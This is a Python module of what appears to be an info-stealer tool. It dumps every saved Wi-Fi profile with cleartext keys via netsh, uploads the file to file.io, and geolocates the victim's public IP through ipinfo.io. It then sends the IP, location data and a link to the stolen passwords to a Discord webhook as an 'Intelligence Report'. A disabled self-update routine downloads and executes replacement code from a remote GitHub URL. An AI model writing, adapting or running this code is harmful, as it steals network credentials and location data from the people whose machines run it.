import subprocess
import os
from config import Config
from datetime import datetime
from _webhook import _WebhookX
from dhooks import Embed
from urllib.request import Request, urlopen
from urllib.error import URLError
import requests
from _random_string import *
import tempfile
import shutil
import sys

cc = Config()

SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/ipinf.py"
CURRENT_VERSION = "1.0.0"
UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"

def check_for_updates():
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            latest_version = response.text.strip()
            if latest_version > CURRENT_VERSION:
                print(f"[+] Update available: {latest_version}")
                download_latest_script()
                return True
            else:
                print("[+] You are using the latest version.")
                return False
        else:
            print(f"[-] Failed to check for updates. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error checking for updates: {e}")
        return False

def download_latest_script():
    try:
        response = requests.get(SCRIPT_URL)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".py") as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name

            shutil.move(temp_file_path, sys.argv[0])
            print(f"[+] Updated to the latest version. Restarting script...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print(f"[-] Failed to download the latest script. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error updating script: {e}")

#check_for_updates()        

class Info():
    def __init__(self):
        self.ip = self.get_public_ip()

    def run_command(self, command):
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout = result.stdout.decode('utf-8', errors='replace')
        stderr = result.stderr.decode('utf-8', errors='replace')
        return stdout, stderr

    def get_wifi_profiles(self):
        output, _ = self.run_command('netsh wlan show profiles')
        profile_names = [profile.strip() for profile in output.split(":")]
        return profile_names

    def get_wifi_profile_output(self, profile_name):
        command = f'netsh wlan show profile name="{profile_name}" key=clear'
        output, _ = self.run_command(command)
        return output

    def get_public_ip(self):
        try:
            response = urlopen(Request("https://api.ipify.org"), timeout=10)
            return response.read().decode().strip()
        except URLError:
            return "Unknown"

    def main(self):
        wifi_profiles = self.get_wifi_profiles()
        rndm_strr = get_random_string(25)
        self.path = os.path.join(os.getenv("APPDATA"), 'roseontop', f'wifi_profiles_{rndm_strr}.txt')
        with open(self.path, "w", encoding="utf-8") as file:
            for profile_name in wifi_profiles:
                profile_output = self.get_wifi_profile_output(profile_name)
                file.write(profile_output + "\n")
                file.write("-" * 50 + "\n")

        upload_url = "https://file.io"
        files = {"file": (os.path.basename(self.path), open(self.path, "rb"))}
        response = requests.post(upload_url, files=files)

        if response.status_code == 200:
            self.wif_dwnld_l = response.json().get("link", "Unknown")
        else:
            self.wif_dwnld_l = "Unknown"

    def send_data(self):
        webx = _WebhookX().get_object()

        self.main()

        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/json")
            if response.status_code == 200:
                self.ipdata = response.json()
        except Exception:
            return {}

        embed = Embed(
            title='Intelligence Report',
            description='Citadel Instance - IP and WIFI Information',
            color=cc.get_color(),
            timestamp=datetime.now().isoformat()
        )

        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())

        embed.add_field(name='IP', value=f'`{self.get_public_ip()}`', inline=False)
        embed.add_field(name='Country', value=f'`{self.ipdata.get("country", "Unknown")}`', inline=False)
        embed.add_field(name='City', value=f'`{self.ipdata.get("city", "Unknown")}`', inline=False)
        embed.add_field(name='Postal', value=f'`{self.ipdata.get("postal", "Unknown")}`', inline=False)
        embed.add_field(name='Latitude', value=f'`{self.ipdata.get("loc", "Unknown").split(",")[0]}`', inline=False)
        embed.add_field(name='Longtitude', value=f'`{self.ipdata.get("loc", "Unknown").split(",")[1]}`', inline=False)
        embed.add_field(name='State', value=f'`{self.ipdata.get("region", "Unknown")}`', inline=False)

        embed.add_field(name='WIFI', value=f'[Download]({self.wif_dwnld_l})', inline=False)

        webx.send(embed=embed)
        os.remove(self.path)

    @staticmethod
    def get_username():
        return os.getlogin()